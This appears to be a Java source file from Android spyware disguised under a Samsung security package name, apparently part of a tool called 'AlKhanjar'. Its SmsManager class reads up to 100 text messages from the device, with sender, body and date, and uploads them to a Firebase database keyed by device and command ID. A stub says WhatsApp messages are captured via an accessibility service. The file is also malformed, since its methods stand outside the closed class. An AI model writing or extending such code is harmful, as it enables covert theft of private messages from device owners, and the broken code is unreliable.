package com.samsung.android.security.v8.managers;

import android.content.Context;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.AlKhanjarApp;

import java.util.HashMap;
import java.util.Map;

public class SmsManager {
    private static final String TAG = "SmsManager";
    private Context context;
    
    public SmsManager(Context context) {
        this.context = context;
    }
    
    protected void sendResponse(String commandId, String status, Object data) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference responseRef = database.getReference("responses")
                .child(AlKhanjarApp.getDeviceId())
                .child(commandId);
            
            Map<String, Object> response = new HashMap<>();
            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());
            
            responseRef.setValue(response);
        } catch (Exception e) {
            Log.e(TAG, "Send response error: " + e.getMessage());
        }
    }
}
    
    public void getSmsMessages(String commandId) {
        try {
            android.database.Cursor cursor = context.getContentResolver().query(
                android.provider.Telephony.Sms.CONTENT_URI,
                null, null, null, android.provider.Telephony.Sms.DEFAULT_SORT_ORDER);
            
            java.util.List<Map<String, String>> messages = new java.util.ArrayList<>();
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    Map<String, String> sms = new HashMap<>();
                    int addressIdx = cursor.getColumnIndex(android.provider.Telephony.Sms.ADDRESS);
                    int bodyIdx = cursor.getColumnIndex(android.provider.Telephony.Sms.BODY);
                    int dateIdx = cursor.getColumnIndex(android.provider.Telephony.Sms.DATE);
                    
                    if (addressIdx >= 0 && bodyIdx >= 0 && dateIdx >= 0) {
                        sms.put("address", cursor.getString(addressIdx));
                        sms.put("body", cursor.getString(bodyIdx));
                        sms.put("date", cursor.getString(dateIdx));
                        messages.add(sms);
                    }
                    
                    if (++count >= 100) break;
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            sendResponse(commandId, "success", messages);
        } catch (Exception e) {
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    public void getWhatsAppMessages(String commandId) {
        sendResponse(commandId, "info", "WhatsApp messages are captured via AccessibilityService");
    }
